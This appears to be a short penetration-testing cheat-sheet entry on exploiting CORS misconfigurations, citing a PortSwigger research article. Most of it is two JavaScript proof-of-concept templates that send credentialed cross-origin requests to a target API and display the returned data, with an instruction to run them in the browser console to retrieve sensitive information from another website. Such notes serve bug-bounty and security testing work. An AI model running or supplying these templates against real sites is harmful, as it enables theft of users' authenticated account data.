## References -

- [Exploiting CORS misconfigurations for Bitcoins and bounties by James Kettle](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

## Template code to retreive -

```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://website.com/endpoint', true);
req.withCredentials = true;
req.send('{}');

function reqListener() {
    alert(this.responseText);
};
```

or

```js
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
 if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
 alert(xhr.responseText);
 }
}
xhr.open('GET', 'http://targetapp/api/v1/user', true); 
xhr.withCredentials = true; 
xhr.send(null);
```
Run this code in console to retreive the sensitive info from other website.
